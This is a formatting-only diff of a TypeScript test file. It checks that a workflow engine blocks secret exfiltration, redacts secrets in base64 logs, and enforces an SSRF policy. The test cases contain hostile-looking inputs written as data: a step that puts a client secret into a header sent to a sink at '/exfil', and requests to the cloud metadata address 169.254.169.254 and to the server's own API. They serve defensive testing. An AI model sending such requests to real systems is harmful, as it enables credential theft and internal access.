@@ -38,7 +38,8 @@ const runYaml = async (text: string, bindings: Record<string, string> = {}) => {
 describe('F2 – a designer cannot exfiltrate a platform secret', () => {
   it('blocks a secret templated into a request to another origin', async () => {
     sinkHits = 0;
-    const run = await runYaml(`
+    const run = await runYaml(
+      `
 name: exfil attempt
 connections: [{ slot: hub, kind: insights-hub }]
 steps:
@@ -49,20 +50,25 @@ steps:
     path: "http://127.0.0.1:${sinkPort}/exfil"
     headers:
       x-leak: "{{ $secret('hub','clientSecret') }}"
-`, { hub });
+`,
+      { hub },
+    );
     expect(run.status).toBe('failed');
     expect(sinkHits).toBe(0);
   });
 
   it('redacts a secret even in a base64-encoded log', async () => {
-    const run = await runYaml(`
+    const run = await runYaml(
+      `
 name: log b64
 connections: [{ slot: hub, kind: insights-hub }]
 steps:
   - id: l
     type: log
     message: "b64: {{ $base64encode($secret('hub','clientSecret')) }}"
-`, { hub });
+`,
+      { hub },
+    );
     const detail = await dana('GET', `/runs/${run.id}`);
     const logs = (detail.logs ?? []).map((l: any) => l.message).join('\n');
     expect(logs).not.toContain('ZGVtby1zZWNyZXQ='); // base64 of demo-secret
@@ -71,43 +77,55 @@ steps:
 });
 
 describe('F4 – SSRF policy on the http node', () => {
-  it('blocks cloud metadata and the server\'s own API, allows the platform', async () => {
+  it("blocks cloud metadata and the server's own API, allows the platform", async () => {
     // default policy: nothing allow-listed (the demo allow-lists loopback, reset it here)
     await s.api('PUT', '/settings', { outboundAllowList: [] });
-    const meta = await runYaml(`
+    const meta = await runYaml(
+      `
 name: metadata
 connections: [{ slot: hub, kind: insights-hub }]
 steps:
   - { id: h, type: http, connection: hub, method: GET, path: "http://169.254.169.254/latest/meta-data/" }
-`, { hub });
+`,
+      { hub },
+    );
     expect(meta.status).toBe('failed');
 
-    const ownApi = await runYaml(`
+    const ownApi = await runYaml(
+      `
 name: self call
 connections: [{ slot: hub, kind: insights-hub }]
 steps:
   - { id: h, type: http, connection: hub, method: GET, path: "http://127.0.0.1:${s.base.split(':').pop()}/api/platforms" }
-`, { hub });
+`,
+      { hub },
+    );
     expect(ownApi.status).toBe('failed');
 
-    const unconfigured = await runYaml(`
+    const unconfigured = await runYaml(
+      `
 name: random host
 connections: [{ slot: hub, kind: insights-hub }]
 steps:
   - { id: h, type: http, connection: hub, method: GET, path: "http://127.0.0.1:${sinkPort}/x" }
-`, { hub });
+`,
+      { hub },
+    );
     expect(unconfigured.status).toBe('failed');
   });
 
   it('an admin allow-list opens a specific origin', async () => {
     await s.api('PUT', '/settings', { outboundAllowList: [`http://127.0.0.1:${sinkPort}`] });
     sinkHits = 0;
-    const run = await runYaml(`
+    const run = await runYaml(
+      `
 name: allowed host
 connections: [{ slot: hub, kind: insights-hub }]
 steps:
   - { id: h, type: http, connection: hub, method: GET, path: "http://127.0.0.1:${sinkPort}/ok", onError: continue }
-`, { hub });
+`,
+      { hub },
+    );
     expect(sinkHits).toBeGreaterThan(0);
     await s.api('PUT', '/settings', { outboundAllowList: [] });
     void run;
